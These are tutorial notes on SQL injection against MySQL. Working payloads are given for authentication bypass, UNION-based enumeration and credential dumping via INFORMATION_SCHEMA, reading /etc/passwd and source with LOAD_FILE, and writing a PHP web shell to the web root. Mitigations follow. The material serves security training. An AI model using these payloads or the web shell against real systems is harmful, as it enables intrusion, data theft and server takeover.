# SQL Injection

Three-tier web apps: client → application server → DBMS. HTTP requests arrive, the back-end builds SQL queries (often using user-supplied data) to fetch the response. When user input flows into the query unsanitized, an attacker can change the final query — that's SQL injection (against RDBMSes like MySQL; NoSQL injection is the MongoDB-world counterpart and a different discipline).

Anatomy of an injection:

{% stepper %}
{% step %}
## Escape the input bounds

Usually with a `'` or `"`.
{% endstep %}

{% step %}
## Subvert the query

Change its logic or append a new one (stacked/Union queries).
{% endstep %}

{% step %}
## Get output back

Read it on the page, infer it, or exfiltrate out-of-band.
{% endstep %}
{% endstepper %}

Impact: credential/data theft, auth bypass, admin-panel access, file read/write on the back-end → web shells → full server control.

## Intro to Databases

DBMS = creates, defines, hosts, manages databases.

Features that matter:

* Concurrency: many users, no corruption
* Consistency
* Security: authentication and fine-grained permissions
* Reliability: backup/rollback
* SQL

Architecture: Tier 1 client (website/GUI) → Tier 2 middleware (libraries/drivers translate interactions into DBMS operations) → Tier 3 DBMS.

App server and DBMS can share a host; serious deployments separate them.

### Relational vs non-relational

* **RDBMS** — schema-templateled tables (entities) linked by keys; the table relationships are the Schema. `users.id` ↔ `posts.user_id` style linking pulls all data about an element in one query. Implementations: MySQL, SQL Server, Oracle, PostgreSQL, MS Access. SQL only exists here.
* **NoSQL** — no tables/rows/columns/keys/schemas; four storage models: Key-Value (JSON/XML pairs), Document-Based, Wide-Column, Graph. Scalable/flexible for unstructured data; MongoDB is the archetype.

## Intro to MySQL

CLI: `mysql -u root -p` (empty `-p` prompts, keeping the password out of bash history), `-h host -P 3306` for remote (capital P = port).

Statements end with `;`; keywords are case-insensitive but database names are not.

```sql
CREATE DATABASE users;
SHOW DATABASES;
USE users;

CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

SHOW TABLES;
DESCRIBE logins;
```

Column properties:

* `AUTO_INCREMENT`
* `NOT NULL` (required)
* `UNIQUE`
* `DEFAULT NOW()`
* `PRIMARY KEY`

## SQL Statements

```sql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');   -- multi-insert

SELECT * FROM logins;
SELECT username,password FROM logins;

DROP TABLE logins;                                -- permanent, no confirmation

ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
ALTER TABLE logins MODIFY newerColumn DATE;
ALTER TABLE logins DROP newerColumn;

UPDATE logins SET password = 'change_password' WHERE id > 1;
```

{% hint style="warning" %}
`UPDATE` without `WHERE` hits every row; skipping a `NOT NULL` column in `INSERT` errors.
{% endhint %}

## Query Results

```sql
SELECT * FROM logins ORDER BY password;                -- ASC default
SELECT * FROM logins ORDER BY password DESC, id ASC;   -- multi-column sort
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;                       -- offset 1 (0-indexed), return 2

SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username = 'admin';
SELECT * FROM logins WHERE username LIKE 'admin%';     -- % = zero or more chars
SELECT * FROM logins WHERE username LIKE '___';        -- _ = exactly one char
```

Strings/dates need quotes; numbers go bare.

## SQL Operators

`AND` / `OR` / `NOT` (also `&&`, `||`, `!`). MySQL truth: non-zero = true (prints 1), 0 = false.

Precedence, high → low:

1. `/ * %`
2. `+ -`
3. Comparisons: `= > < <= >= != LIKE`
4. `NOT`
5. `AND`
6. `OR`

AND binds before OR — the reason auth-bypass OR injections work:

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;   -- subtraction first, then comparisons, then AND
```

## Intro to SQL Injections

PHP back-end pattern that causes the whole module:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

Input `1'; DROP TABLE users;` turns the query into `... like '%1'; DROP TABLE users;'` — code after the escaped quote executes as SQL.

Stacked queries after `;` don't actually work on MySQL — they do on MSSQL/PostgreSQL; MySQL needs Union and friends.

The trailing unclosed quote causes a syntax error — a real injection must leave a valid query, via comments or balanced quote counts.

### SQLi taxonomy by output retrieval

* **In-band** — output on the page:
  * Union Based: direct the output into a printed column.
  * Error Based: intentionally error and read the output from the error message.
* **Blind** — no output:
  * Boolean Based: conditional statement controls whether the page shows the normal response.
  * Time Based: `SLEEP()` delays the response when the condition is true.
* **Out-of-band** — no direct access at all: exfiltrate to a remote location, such as DNS, and read it there.

This module covers Union Based.

## Subverting Query Logic

Target:

```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

### Discovery first

Probe with `'` `"` `#` `;` `)`.

URL-encode them as `%27 %22 %23 %3B %29` when injected into a GET URL.

A SQL syntax error instead of "login failed" = likely vulnerable.

### OR injection

Make the `WHERE` always true. `admin' or '1'='1` as the username gives:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

AND evaluates first (`'1'='1' AND password='something'` → false), then OR — but `username='admin'` alone carries the query to true.

Note the dropped final quote in the payload: the original query's closing quote fills the slot, keeping the count even.

With an unknown username, inject the OR on the password side too — `' or '1' = '1` in both fields logs in as the first user in the table regardless of credentials.

PayloadAllTheThings keeps a comprehensive auth-bypass payload list keyed to query shapes.

## Using Comments

MySQL comments:

* `--` — two dashes **plus a space**; URL-encoded as `--+` since `+` = space; the module writes `-- -` to show the space.
* `#` — `%23` in URLs; browsers treat raw `#` as a fragment.
* `/**/` — inline comment.

`admin'--` as the username:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Everything after the comment vanishes — password check gone, syntax guaranteed clean.

### Parenthesis case

Query shaped as:

```sql
WHERE (username='admin' AND id > 1) AND password='<md5>'
```

The password is hashed client-side before the query, so that field is uninjectable.

`admin'--` fails because of an unclosed parenthesis. Close it in the payload:

```sql
admin')-- `
```

This produces:

```sql
WHERE (username='admin')
```

Logged in.

## Union Clause

`UNION` merges results of multiple `SELECT`s — one injection to dump data from any table/database.

Constraints:

* Equal column counts on both sides (`ERROR 1222` otherwise)
* Matching column data types

Uneven columns → pad with junk:

* Numbers: `SELECT 1,2,3,4` work and double as position markers.
* Strings work.
* `NULL` fits every type and is the advanced choice.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 from passwords-- '
```

## Union Injection

Workflow against `search.php?port_code=cn`: a `'` throws a SQL error, so it is vulnerable, and output is visible, so Union-based applies.

{% stepper %}
{% step %}
## Column count

Use either method:

```sql
' order by 1-- -        -- increment until "Unknown column '5' in 'order clause'" → 4 columns
cn' UNION select 1,2,3-- -      -- errors until the count matches; 1,2,3,4 succeeds
```

`ORDER BY` works until it errors. `UNION` errors until it works. Either answer: 4 columns.
{% endstep %}

{% step %}
## Injection location

Not every column is printed; IDs usually are not.

```sql
cn' UNION select 1,2,3,4-- -
```

This shows which numbers come back. In the module case, `2`, `3`, and `4` print; column `1` is invisible.

Put real queries only in printed positions. Confirm with a data-bearing test:

```sql
cn' UNION select 1,@@version,3,4-- -     -- → 10.3.22-MariaDB-1ubuntu1
```
{% endstep %}
{% endstepper %}

## Database Enumeration

### Fingerprint the DBMS

This guides which queries work.

Hint first: Apache/Nginx → probably Linux → probably MySQL; IIS → probably MSSQL.

Then confirm with MySQL probes by output situation:

| Payload            | Situation           | MySQL result                                       |
| ------------------ | ------------------- | -------------------------------------------------- |
| `SELECT @@version` | Full query output   | Version string, such as `10.3.22-MariaDB-1ubuntu1` |
| `SELECT POW(1,1)`  | Numeric output only | `1`                                                |
| `SELECT SLEEP(5)`  | Blind/no output     | 5-second delay                                     |

### INFORMATION\_SCHEMA

Metadata database holding every database, table, and column.

Cross-database references use the dot operator:

```sql
SELECT * FROM my_database.users;
```

Enumeration chain: each step is a UNION payload in a printed column.

```sql
-- databases (ignore mysql/information_schema/performance_schema/sys defaults)
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- current database
cn' UNION select 1,database(),2,3-- -

-- tables in a target database
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

-- columns of a target table
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

-- dump the data (dot operator — the app runs in ilfreight, the table lives in dev)
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Result shape: schema names → `ilfreight` (current) and `dev` (interesting); `dev` holds credentials/framework/pages/posts; credentials has username/password; the dump yields creds, hashes, and an API key.

## Reading Files

File operations need the **FILE** privilege. Enumerate first:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -                                   -- who are we? root@localhost
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -   -- Y = superuser
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

`FILE` in the list → read with `LOAD_FILE()`. The OS user running MySQL also needs read rights on the file.

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -    -- leaks app source; Ctrl+U to view since HTML renders
```

## Writing Files

Requirements:

* `FILE` privilege
* `secure_file_priv` not blocking
* OS write access to the target path

Check the variable through `INFORMATION_SCHEMA`; `SHOW VARIABLES` does not fit a UNION:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Values:

* Empty = read/write anywhere (MariaDB default — the good case)
* A path = restricted to it (MySQL default `/var/lib/mysql-files`)
* `NULL` = no file operations anywhere (some modern configs)

`SELECT ... INTO OUTFILE` writes query results, and strings write directly:

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

No page error = likely written; browse to the file to confirm.

Junk columns land in the file — use `""` instead of numbers for clean output. `FROM_BASE64("...")` handles long/binary writes.

### Web shell

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

```
http://SERVER_IP:PORT/shell.php?0=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Web root discovery when unknown:

* `LOAD_FILE` the server configuration:
  * `/etc/apache2/apache2.conf`
  * `/etc/nginx/nginx.conf`
  * IIS `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
* Fuzz candidate web roots with dedicated wordlists.
* Mine server errors.

## Mitigating SQL Injection

* **Input sanitization** — `mysqli_real_escape_string($conn, $_POST['username'])` escapes `'` and `"` (`pg_escape_string` for PostgreSQL).
* **Input validation** — whitelist shape: port codes are letters/spaces → `preg_match("/^[A-Za-z\s]+$/", $code)` or die.
* **User privileges** — least privilege DB users; never superusers for web apps:

```sql
CREATE USER 'reader'@'localhost';
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

The reader user then sees only its table and its database in `INFORMATION_SCHEMA`; other tables error with permission denied.

* **WAF** — ModSecurity/Cloudflare-style request filtering, such as dropping anything containing `INFORMATION_SCHEMA`.
* **Parameterized queries** — placeholders, never concatenation:

```php
$query = "SELECT * FROM logins WHERE username=? AND password = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
```

None of these is absolute — application logic can still be injectable — and the principles port beyond PHP.
